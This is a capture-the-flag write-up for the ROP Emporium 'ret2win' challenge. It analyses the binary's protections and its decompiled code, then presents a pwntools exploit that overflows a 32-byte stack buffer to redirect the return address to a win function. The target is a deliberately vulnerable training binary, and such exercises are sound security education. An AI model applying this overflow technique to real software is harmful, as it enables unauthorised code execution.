Ret2win is the first challenge from Rop Emporioum series.
We have to overwrite return address and call the win function to obtain the flag!


# Analyzing
Lets start with the File command.
```
ret2win: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=19abc0b3bb228157af55b8e16af7316d54ab0597, not stripped
```
Nice! we have a 64 bit not stripped executable. \
Lets continue by checking the protections of the binary running checksec
```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   69 Symbols        No    0                               3ret2win
```
1. Stack cookie Not found so its easy to overwrite return address
2. NX enabled so stack is no long executable
3. No pie (hardcoded base address)

Lets open it in in ida. 
```c
char s[32]; // [rsp+0h] [rbp-20h] BYREF

memset(s, 0, sizeof(s));
puts("For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!");
puts("What could possibly go wrong?");
puts("You there, may I have your input please? And don't worry about null bytes, we're using read()!\n");
printf("> ");
read(0, s, 56uLL);
return puts("Thank you!");
```

Seems really straightforward the path that we need to follow. \
Binary reads 56 bytes of data and stores them on an array of length 32.Thats a buffer overflow!
Searching a bit more we can detect a function `ret2win` thats prints out the flag.
```c
puts("Well done! Here's your flag:");
return system("/bin/cat flag.txt");
```
In summary, we can overwrite our return address to win function and grab the flag!

# Exploiting
Writing our exploit
```python
from pwn import *

# Set up pwntools for the correct architecture. See `context.binary/arch/bits/endianness` for more
context.binary = elfexe = ELF('./ret2win') #FIXME

target = process([elfexe.path])

payload  = b"A"* 40      # Fill the buffer and overwrite base address 
payload += p64(0x400770) # ret for alignment
payload += p64(0x400756) # Jump to ret2win function

target.sendafter("> ", payload) 
target.interactive()
    
```
We manage to get the flag!
``
Well done! Here's your flag:
ROPE{a_placeholder_32byte_flag!}
``
